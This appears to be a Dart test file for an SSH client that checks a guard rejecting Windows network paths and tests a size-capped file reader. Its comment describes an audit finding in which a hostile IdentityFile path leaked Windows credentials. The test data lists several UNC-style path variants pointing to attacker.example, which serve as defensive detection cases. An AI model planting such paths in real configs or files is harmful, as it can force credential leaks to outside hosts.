import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:zestssh/utils/capped_file.dart';
import 'package:zestssh/utils/network_path.dart';

/// A hostile SSH config sent a person's Windows credentials to a server (a
/// security audit): `IdentityFile /\attacker.example\s\id` got
/// past a guard that looked for `\\` and `//`, and Windows reads `/\` as a network
/// path. The read happens as the file reaches its review, before Import is pressed.
void main() {
  group('a network path', () {
    for (final path in [
      r'\\attacker.example\s\id',
      '//attacker.example/s/id',
      r'/\attacker.example\s\id',
      r'\/attacker.example/s/id',
      r'\\?\UNC\attacker.example\s\id',
      r'\\.\UNC\attacker.example\s\id',
      r'//?/UNC/attacker.example/s/id',
      r'\??\UNC\attacker.example\s\id',
      r'/??/UNC/attacker.example/s/id',
      r'  /\attacker.example\s\id',
    ]) {
      test('$path: yes', () => expect(isNetworkPath(path), isTrue));
    }
    for (final path in [
      r'C:\Users\sam\.ssh\id',
      'C:/Users/sam/.ssh/id',
      '/home/sam/.ssh/id',
      'keys/deploy',
      r'keys\deploy',
      r'\Users\sam\.ssh\id',
      '/?/x',
      '',
    ]) {
      test("'$path': no", () => expect(isNetworkPath(path), isFalse));
    }
  });

  group('a file read to a cap', () {
    late Directory dir;
    setUp(() async => dir = await Directory.systemTemp.createTemp('zest_capped_'));
    tearDown(() => dir.delete(recursive: true));

    test('at the cap it is read whole; a byte over, it is refused', () async {
      final file = File('${dir.path}/f')..writeAsBytesSync(List<int>.filled(1024, 7));
      expect(await readFileCapped(file.path, 1024), hasLength(1024));
      expect(await readFileCapped(file.path, 1023), isNull);
    });
  });
}
